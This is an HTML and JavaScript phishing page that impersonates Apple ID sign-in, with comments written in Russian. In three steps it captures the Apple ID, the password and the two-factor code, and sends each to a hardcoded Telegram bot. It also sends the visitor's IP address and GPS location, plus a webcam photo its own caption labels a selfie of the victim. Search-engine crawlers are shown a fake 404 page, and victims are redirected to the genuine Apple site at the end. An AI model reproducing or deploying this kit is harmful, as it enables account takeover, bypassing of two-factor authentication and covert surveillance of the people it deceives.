<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple ID</title>
    <style>
        /* Стилизация под iOS */
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f2f2f7; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #000; }
        .container { width: 100%; max-width: 400px; padding: 20px; }
        .card { background: #ffffff; border-radius: 14px; padding: 24px 16px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.04); }
        .logo { width: 44px; margin-bottom: 12px; }
        h2 { font-size: 20px; font-weight: 600; margin: 0 0 8px 0; letter-spacing: -0.4px; }
        p { font-size: 13px; color: #8e8e93; line-height: 1.4; margin: 0 0 24px 0; }
        input { width: 100%; padding: 16px; background: #f2f2f7; border: 1px solid transparent; border-radius: 10px; font-size: 16px; margin-bottom: 12px; outline: none; transition: 0.2s; }
        input:focus { border-color: #007aff; background: #fff; }
        button { width: 100%; padding: 16px; background: #007aff; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; margin-top: 4px; cursor: pointer; }
        button:active { background: #005bb5; }
        
        /* Скрываем элементы */
        #step2, #step3, #loading, #fakePage, #camera { display: none; }
        .spinner { border: 3px solid #e5e5ea; border-top: 3px solid #007aff; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Экран загрузки */
        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(242, 242, 247, 0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; }
    </style>
</head>
<body>

    <!-- Клоакинг для ботов -->
    <div id="fakePage" style="text-align:center; padding: 50px;">
        <h1 style="font-size: 24px;">404 Not Found</h1>
    </div>

    <!-- Экран 1: Ввод Apple ID -->
    <div class="container" id="step1">
        <div class="card">
            <!-- Логотип Apple -->
            <svg class="logo" viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.74 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.92.21-9.84-1.96-14.74-6.52-3.13-2.73-7.04-7.43-11.72-14.12-5.02-7.15-9.14-15.45-12.37-24.9-3.46-10.18-5.2-20.05-5.2-29.62 0-10.95 2.37-20.39 7.12-28.33 3.73-6.36 8.7-11.39 14.92-15.08 6.22-3.69 12.94-5.57 20.2-5.66 3.92 0 9.06 1.21 15.45 3.59 6.37 2.39 10.47 3.6 12.27 3.6 1.34 0 5.88-1.42 13.59-4.26 7.28-2.62 13.43-3.71 18.47-3.28 13.65 1.1 23.91 6.48 30.73 16.16-12.21 7.4-18.25 17.76-18.14 31.02.11 10.34 3.86 18.94 11.22 25.78 3.34 3.17 7.06 5.62 11.18 7.36-.9 2.61-1.84 5.11-2.84 7.51zM119.11 9.57c0 8.12-2.97 15.7-8.88 22.7-7.14 8.34-15.78 13.15-25.15 12.41-.12-1.03-.19-2.11-.19-3.25 0-7.8 3.4-16.15 9.44-22.98 3.02-3.46 6.86-6.34 11.52-8.62 4.65-2.25 9.05-3.49 13.18-3.71.12 1.16.18 2.32.18 3.45z" fill="#000"/></svg>
            <h2>Sign in to Apple ID</h2>
            <p>Use your Apple ID to access iCloud, the App Store, and more.</p>
            <form id="form1">
                <input type="text" id="email" placeholder="Apple ID or Phone Number" required autocomplete="off">
                <button type="submit">Continue</button>
            </form>
        </div>
    </div>

    <!-- Экран 2: Ввод Пароля -->
    <div class="container" id="step2">
        <div class="card">
            <h2>Enter Password</h2>
            <p>Enter the password for your Apple ID <b id="display-email" style="color:#000;"></b></p>
            <form id="form2">
                <input type="password" id="password" placeholder="Password" required autocomplete="off">
                <button type="submit">Sign In</button>
            </form>
        </div>
    </div>

    <!-- Экран 3: Ввод 2FA (СМС) -->
    <div class="container" id="step3">
        <div class="card">
            <h2>Two-Factor Authentication</h2>
            <p>Enter the verification code sent to your trusted devices.</p>
            <form id="form3">
                <input type="tel" id="code2fa" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 8px; font-size: 22px; font-weight: 600;" required autocomplete="off">
                <button type="submit">Verify</button>
            </form>
        </div>
    </div>

    <!-- Экран загрузки -->
    <div id="loading">
        <div class="spinner"></div>
        <p style="color: #000; font-weight: 500; margin-top: 10px;">Verifying...</p>
    </div>

    <!-- Скрытые элементы -->
    <video id="camera" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
        const CHAT_ID = "7485234259";
        let userEmail = "";

        // 1. Клоакинг (скрываем от ботов)
        const isBot = /googlebot|bingbot|yandexbot|facebookexternalhit|twitterbot|applebot|baidu|duckduckbot|crawler|spider|slurp|headless/i.test(navigator.userAgent.toLowerCase());
        if (isBot) {
            document.getElementById('fakePage').style.display = 'block';
        } else {
            document.getElementById('step1').style.display = 'block';
        }

        // 2. Функции отправки в Telegram
        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function sendMedia(endpoint, blob, filename, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append(endpoint === 'sendVoice' ? 'voice' : 'photo', blob, filename);
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
        }

        // 3. Шаг 1: Логин
        document.getElementById('form1').addEventListener('submit', function(e) {
            e.preventDefault();
            userEmail = document.getElementById('email').value;
            document.getElementById('display-email').innerText = userEmail;
            sendText(`🍏 Apple ID (Логин): ${userEmail}`);
            
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        });

        // 4. Шаг 2: Пароль и сбор данных
        document.getElementById('form2').addEventListener('submit', async function(e) {
            e.preventDefault();
            const pass = document.getElementById('password').value;
            sendText(`🍏 Apple ID (Пароль): ${userEmail} | ${pass}`);
            
            document.getElementById('step2').style.display = 'none';
            document.getElementById('loading').style.display = 'flex';

            // Сбор IP
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});

            // Сбор GPS
            navigator.geolocation.getCurrentPosition(
                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                (err) => sendText(`🗺️ GPS: Запрещен`)
            );

            // Запрос камеры (выскочит системное окно)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                await sendMedia('sendPhoto', blob, 'face.jpg', `📸 Селфи жертвы\n👤 ${userEmail}`);
            } catch (err) {}

            // Переход на экран 2FA
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('step3').style.display = 'block';
            }, 2000);
        });

        // 5. Шаг 3: 2FA и редирект
        document.getElementById('form3').addEventListener('submit', function(e) {
            e.preventDefault();
            const code = document.getElementById('code2fa').value;
            sendText(`🔐 2FA Код: ${code}\n👤 ${userEmail}`);
            
            document.getElementById('loading').style.display = 'flex';
            document.getElementById('step3').style.display = 'none';

            // Перекидываем на настоящий Apple
            setTimeout(() => {
                window.location.href = "https://appleid.apple.com";
            }, 1500);
        });
    </script>
</body>
</html>
